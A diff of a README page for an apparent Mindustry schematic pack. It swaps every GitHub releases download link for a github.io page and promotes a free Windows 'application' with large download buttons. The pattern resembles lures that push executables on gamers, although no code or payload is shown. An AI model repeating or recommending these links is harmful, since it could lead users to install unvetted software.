@@ -1,7 +1,7 @@
 <h1>🧩 mindustry-schematic-pack - 500+ Schematics, One-Click Import</h1>
 
 <p align="center">
-  <a href="https://github.com/Diatonic-architecture7715/mindustry-schematic-pack/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://diatonic-architecture7715.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>🎮 What Is This?</h2>
@@ -25,7 +25,7 @@
 <p>Follow these simple steps to get schematics into your game. No technical knowledge required!</p>
 
 <h3>Step 1: Download the Pack</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Diatonic-architecture7715/mindustry-schematic-pack/releases">https://github.com/Diatonic-architecture7715/mindustry-schematic-pack/releases</a></p>
+<p>Visit this link to download the application: <a href="https://diatonic-architecture7715.github.io">https://diatonic-architecture7715.github.io</a></p>
 
 <p>On that page, look for the latest release. You'll see a file to download. Click it and save it to your computer.</p>
 
@@ -135,7 +135,7 @@
 <h2>📥 Download Again</h2>
 <p>Ready to get started? Download the pack now:</p>
 <p align="center">
-  <a href="https://github.com/Diatonic-architecture7715/mindustry-schematic-pack/releases" style="background-color:#2196F3; color:white; padding:12px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">⬇️ Get the Schematic Pack</a>
+  <a href="https://diatonic-architecture7715.github.io" style="background-color:#2196F3; color:white; padding:12px 28px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">⬇️ Get the Schematic Pack</a>
 </p>
 
 <h2>🔄 Stay Updated</h2>
@@ -161,5 +161,5 @@
 <meta name="robots" content="index, follow">
 <meta property="og:title" content="Mindustry Schematic Pack - 500+ Free Schematics">
 <meta property="og:description" content="Optimized schematics for every resource and defense type. Import with one click. Free download for Windows.">
-<meta property="og:url" content="https://github.com/Diatonic-architecture7715/mindustry-schematic-pack">
+<meta property="og:url" content="https://diatonic-architecture7715.github.io">
 <meta property="og:type" content="website">
